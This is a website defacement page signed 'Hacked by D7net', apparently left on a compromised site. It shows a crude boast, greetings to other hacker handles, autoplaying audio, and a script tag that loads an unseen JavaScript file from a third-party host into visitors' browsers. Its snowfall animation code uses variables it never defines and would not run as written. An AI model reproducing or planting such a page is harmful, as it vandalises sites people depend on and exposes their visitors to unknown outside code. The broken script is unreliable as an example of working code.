<html>
  <head>
  <title>Terkentoed!</title>
  <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
  <meta name="keywords" content="Desktop77N3T | D704T"/>
  <meta name="description" content="Hacked by D7net">
  <meta name="author" content="Hacked by D7net">
  <meta name="googlebot" content="all,index,follow">
  <meta name="robots" content="index, follow">
  <style>
  body	{
    Background: white;
    Color: black;
    text-align: center;
    font-size: 12pt;
    font-family: 'Dosis', sans-serif;
    letter-spacing: 2px;
    line-height: 25px;
  }
  a 	{
    text-decoration: none;
    color: black;
  }
  a:hover	{
    text-decoration: none;
    color: maroon;
  }
  d7net {
    font-size: 16pt; 
    font-family: 'Sedgwick Ave', cursive;
  }
  h1	{
    font-size: 30pt;
  }
  img {
    border-radius: 50%;
  }
  </style>
  <script type="text/­javascript" src="http://­yourjavascript.com/­56133167111/fb.js"></script>
  <script type="text/javascript">
  
  var snow=new Array()
  var marginbottom
  var marginright
  var timer
  var i_snow=0
  var x_mv=new Array();
  var crds=new Array();
  var lftrght=new Array();
  var browserinfos=navigator.userAgent 
  var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
  var ns6=document.getElementById&&!document.all
  var opera=browserinfos.match(/Opera/)  
  var browserok=ie5||ns6||opera
  
  function randommaker(range) {       
      rand=Math.floor(range*Math.random())
      return rand
  }
  
  function initsnow() {
      if (ie5 || opera) {
          marginbottom = document.body.clientHeight
          marginright = document.body.clientWidth
      }
      else if (ns6) {
          marginbottom = window.innerHeight
          marginright = window.innerWidth
      }
      var snowsizerange=snowmaxsize-snowminsize
      for (i=0;i<=snowmax;i++) {
          crds[i] = 0;                      
          lftrght[i] = Math.random()*15;         
          x_mv[i] = 0.03 + Math.random()/10;
          snow[i]=document.getElementById("s"+i)
          snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
          snow[i].size=randommaker(snowsizerange)+snowminsize
          snow[i].style.fontSize=snow[i].size
          snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
          snow[i].sink=sinkspeed*snow[i].size/5
          if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
          if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
          if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
          if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
          snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
          snow[i].style.left=snow[i].posx
          snow[i].style.top=snow[i].posy
      }
      movesnow()
  }
  
  function movesnow() {
      for (i=0;i<=snowmax;i++) {
          crds[i] += x_mv[i];
          snow[i].posy+=snow[i].sink
          snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
          snow[i].style.top=snow[i].posy
          
          if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
              if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
              if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
              if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
              if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
              snow[i].posy=0
          }
      }
      var timer=setTimeout("movesnow()",1)
  }
  
  for (i=0;i<=snowmax;i++) {
      document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
  }
  if (browserok) {
      window.onload=initsnow
  }
  </script>
  </head>
  <body>
  <link href="https://fonts.googleapis.com/css?family=Dosis|Sedgwick+Ave" rel="stylesheet">
  <img src='https://i.pinimg.com/736x/9a/34/e1/9a34e18b3d6581638f0eeeeacf46df6f.jpg' align="center" style="width:300px; height:300px;"><br><br>
  <d7net>My Bitch Is Your System >,< </d7net><br><br>Hacked by D7net | D704T</a><br><br>
<br>Greetz : ./BarBarking - ./Mr.TahuSumedang - Syntax7 - N4ST4R_ID - VenomGhost - NamiSec<br><br><audio src="https://j.top4top.io/m_1936mokgt0.mp3" autoplay="" controls="https://j.top4top.io/m_1936mokgt0.mp3"></audio>
  </body>
  </html>